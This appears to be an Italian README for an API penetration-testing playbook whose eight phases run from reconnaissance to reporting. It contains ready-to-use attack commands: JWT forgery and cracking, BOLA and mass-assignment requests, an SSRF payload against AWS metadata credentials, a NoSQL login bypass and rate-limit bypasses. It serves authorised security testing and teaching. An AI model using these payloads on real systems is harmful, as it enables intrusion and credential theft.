
<div align="center">

```
 █████╗ ██████╗ ██╗███╗   ██╗ █████╗ ████████╗ ██████╗ ██████╗
██╔══██╗██╔══██╗██║████╗  ██║██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗
███████║██████╔╝██║██╔██╗ ██║███████║   ██║   ██║   ██║██████╔╝
██╔══██║██╔═══╝ ██║██║╚██╗██║██╔══██║   ██║   ██║   ██║██╔══██╗
██║  ██║██║     ██║██║ ╚████║██║  ██║   ██║   ╚██████╔╝██║  ██║
╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝
```

### 🔐 The API Penetration Testing Playbook

*Because someone has to break it before the bad guys do.*

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![OWASP](https://img.shields.io/badge/OWASP-API%20Top%2010%202023-red.svg)](https://owasp.org/API-Security/)
[![Free Tools](https://img.shields.io/badge/Tools-100%25%20Free-39ff14.svg)](#-tool-stack)
[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
[![Phases](https://img.shields.io/badge/Phases-8-00d4ff.svg)](#-fasi)

</div>

---

> **⚠️ DISCLAIMER LEGALE** — Questo progetto è destinato **esclusivamente** ad attività di penetration testing su sistemi per i quali si dispone di **esplicita autorizzazione scritta**. L'uso non autorizzato su sistemi di terzi è illegale e punibile penalmente. Gli autori declinano ogni responsabilità per usi impropri.

---

## 🤔 Cos'è Apinator?

**Apinator** è una guida operativa completa per Security Engineer che devono fare penetration test su applicazioni API REST e GraphQL. Niente teoria inutile — solo comandi pronti all'uso, tool gratuiti e le tecniche che funzionano davvero.

Copre l'intero ciclo: dalla ricognizione passiva al reporting finale, seguendo l'**OWASP API Security Top 10 2023**.

```bash
# Esempio: in 3 comandi hai già mappato tutti gli endpoint
subfinder -d target.com -all | dnsx -silent | httpx -silent -o hosts.txt
kr scan -w routes-large.kite --filename hosts.txt
ffuf -u https://target.com/api/FUZZ -w api-wordlist.txt -mc 200,401,403
```

---

## 🗂 Struttura della Repo

```
apinator/
├── README.md                  ← sei qui
├── LICENSE
├── guide/
│   └── api-pentest-guide.html ← guida interattiva completa
├── scripts/
│   ├── bola_tester.py         ← BOLA/IDOR automated tester
│   ├── race_condition.py      ← race condition con asyncio
│   └── subdomain_pipeline.sh  ← recon pipeline completa
├── wordlists/
│   └── spec_paths.txt         ← path comuni OpenAPI/Swagger
├── templates/
│   └── finding_template.md    ← template finding per il report
└── CONTRIBUTING.md
```

---

## 🚀 Quick Start

### Prerequisiti

```bash
# Go tools
go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install github.com/projectdiscovery/httpx/cmd/httpx@latest
go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest
go install github.com/projectdiscovery/katana/cmd/katana@latest

# Python tools
pip3 install trufflehog gitleaks clairvoyance graphql-cop --break-system-packages

# Kiterunner (API-specific bruteforcer)
git clone https://github.com/assetnote/kiterunner
cd kiterunner && make build
sudo mv dist/kr /usr/local/bin/

# jwt_tool
git clone https://github.com/ticarpi/jwt_tool
pip3 install -r jwt_tool/requirements.txt --break-system-packages

# sqlmap
git clone https://github.com/sqlmapproject/sqlmap
```

### Apri la guida interattiva

```bash
git clone https://github.com/YOUR_USERNAME/apinator
cd apinator
open guide/api-pentest-guide.html   # macOS
xdg-open guide/api-pentest-guide.html  # Linux
```

---

## 📋 Fasi

| # | Fase | Obiettivo | Tool Chiave | OWASP |
|---|------|-----------|-------------|-------|
| 01 | [Reconnaissance](#01--reconnaissance) | Mappare la superficie d'attacco senza toccare il target | Amass, Subfinder, TruffleHog | API9 |
| 02 | [Enumeration](#02--enumeration) | Trovare tutti gli endpoint e metodi HTTP | Kiterunner, ffuf | API9 |
| 03 | [Authentication](#03--authentication) | Attaccare JWT, OAuth, API Key | jwt_tool, hashcat | API2 |
| 04 | [Authorization](#04--authorization) | BOLA/IDOR, BFLA, Mass Assignment | Burp Autorize, script custom | API1, API3, API5 |
| 05 | [Input Validation](#05--input-validation) | SQLi, NoSQLi, SSRF, XXE | sqlmap, interactsh | API7, API8 |
| 06 | [Rate Limit & Logic](#06--rate-limit--business-logic) | Bypass rate limit, race condition, logic flaw | Turbo Intruder, asyncio | API4, API6 |
| 07 | [GraphQL](#07--graphql) | Schema extraction, batching, DoS | clairvoyance, graphql-cop | API8 |
| 08 | [Reporting](#08--reporting) | Finding documentati e azionabili | Ghostwriter, Pwndoc | — |

---

## 01 · Reconnaissance

**Obiettivo**: raccogliere informazioni senza inviare richieste dirette al target.

```bash
# Google Dorks — trova Swagger esposto
site:target.com intitle:"swagger ui"
site:target.com inurl:"api-docs"
site:github.com "target.com" "api_key"

# Endpoint storici con Gau
gau target.com | grep -E "api|v[0-9]|rest|graphql" | sort -u

# Secret scanning su repo pubblici
trufflehog github --org=target-org --only-verified
```

---

## 02 · Enumeration

**Obiettivo**: bruteforce endpoint API con wordlist dedicate.

```bash
# Kiterunner — il migliore per le API
kr scan https://target.com -w routes-large.kite --ignore-length=34

# ffuf — discovery + verb tampering
ffuf -u https://target.com/api/FUZZ -w api-endpoints.txt -mc 200,401,403 -fc 404
```

---

## 03 · Authentication

**Obiettivo**: attaccare JWT, OAuth e API Key.

```bash
# JWT — algorithm none attack
python3 jwt_tool.py TOKEN -X a

# JWT — RS256 → HS256 confusion
python3 jwt_tool.py TOKEN -X k -pk pub.pem

# JWT — brute force secret
hashcat -a 0 -m 16500 TOKEN rockyou.txt
```

---

## 04 · Authorization

**Obiettivo**: BOLA, BFLA e Mass Assignment.

```bash
# BOLA — accedi alle risorse di un altro utente
curl -X GET https://target.com/api/v1/users/1235/docs \
  -H "Authorization: Bearer USER_A_TOKEN"

# Mass Assignment — inietta proprietà privilegiate
curl -X POST https://target.com/api/v1/register \
  -d '{"username":"x","password":"y","role":"admin","is_admin":true}'
```

> 📄 Script completo: [`scripts/bola_tester.py`](scripts/bola_tester.py)

---

## 05 · Input Validation

**Obiettivo**: injection e SSRF.

```bash
# SQLi su endpoint API
sqlmap -u "https://target.com/api/v1/users?id=1" \
  --headers="Authorization: Bearer TOKEN" --level=5 --batch

# SSRF — AWS metadata
curl -X POST https://target.com/api/fetch \
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'

# NoSQL injection — MongoDB auth bypass
curl -X POST https://target.com/api/login \
  -d '{"username":{"$ne":""},"password":{"$ne":""}}'
```

---

## 06 · Rate Limit & Business Logic

**Obiettivo**: bypass rate limiting e logic flaw.

```bash
# IP spoofing headers
curl -X POST https://target.com/api/login \
  -H "X-Forwarded-For: 1.2.3.4" \
  -d '{"username":"admin","password":"test"}'

# Quantità negative (business logic)
curl -X POST https://target.com/api/cart \
  -d '{"product_id":1,"quantity":-5}'
```

> 📄 Script race condition: [`scripts/race_condition.py`](scripts/race_condition.py)

---

## 07 · GraphQL

**Obiettivo**: estrarre schema e attaccare query/mutation.

```bash
# Schema anche con introspection disabilitata
python3 -m clairvoyance -o schema.json https://target.com/graphql

# Security audit automatico
graphql-cop -t https://target.com/graphql

# Batching attack — brute force su mutation login
# [{"query":"mutation{login(user:\"admin\",pass:\"0001\"){token}}"},...]
```

---

## 08 · Reporting

Ogni finding deve avere:

- **Severità** con CVSS v3.1 score
- **CWE** e riferimento **OWASP API Top 10**
- **PoC** riproducibile con curl command
- **Impatto business** in linguaggio non tecnico
- **Remediation** specifica con esempi

> 📄 Template: [`templates/finding_template.md`](templates/finding_template.md)

**Tool consigliati:**
- [Ghostwriter](https://github.com/GhostManager/Ghostwriter) — piattaforma completa per pentest report
- [Pwndoc](https://github.com/pwndoc/pwndoc) — generatore report leggero, self-hosted

---

## 🛠 Tool Stack

Tutti i tool sono **100% gratuiti e open source**.

| Tool | Categoria | Link |
|------|-----------|------|
| Subfinder | Recon | [projectdiscovery/subfinder](https://github.com/projectdiscovery/subfinder) |
| Amass | Recon | [owasp-amass/amass](https://github.com/owasp-amass/amass) |
| TruffleHog | Secret Scan | [trufflesecurity/trufflehog](https://github.com/trufflesecurity/trufflehog) |
| Kiterunner | Enumeration | [assetnote/kiterunner](https://github.com/assetnote/kiterunner) |
| ffuf | Fuzzing | [ffuf/ffuf](https://github.com/ffuf/ffuf) |
| jwt_tool | Auth | [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool) |
| sqlmap | Injection | [sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap) |
| interactsh | SSRF/OOB | [projectdiscovery/interactsh](https://github.com/projectdiscovery/interactsh) |
| clairvoyance | GraphQL | [nikitastupin/clairvoyance](https://github.com/nikitastupin/clairvoyance) |
| graphql-cop | GraphQL | [dolevf/graphql-cop](https://github.com/dolevf/graphql-cop) |
| Ghostwriter | Reporting | [GhostManager/Ghostwriter](https://github.com/GhostManager/Ghostwriter) |

---

## 🤝 Contributing

Pull request benvenute! Soprattutto:

- Nuove tecniche o varianti di attacco
- Script di automazione
- Fix a comandi non aggiornati
- Traduzioni

Leggi [`CONTRIBUTING.md`](CONTRIBUTING.md) prima di aprire una PR.

---

## 📜 License

MIT © 2025 — vedi [`LICENSE`](LICENSE) per i dettagli.

---

<div align="center">

**Se questa repo ti è stata utile, lascia una ⭐ — costa poco e fa molto.**

*Hacked with ❤️ and too much caffeine*

</div>
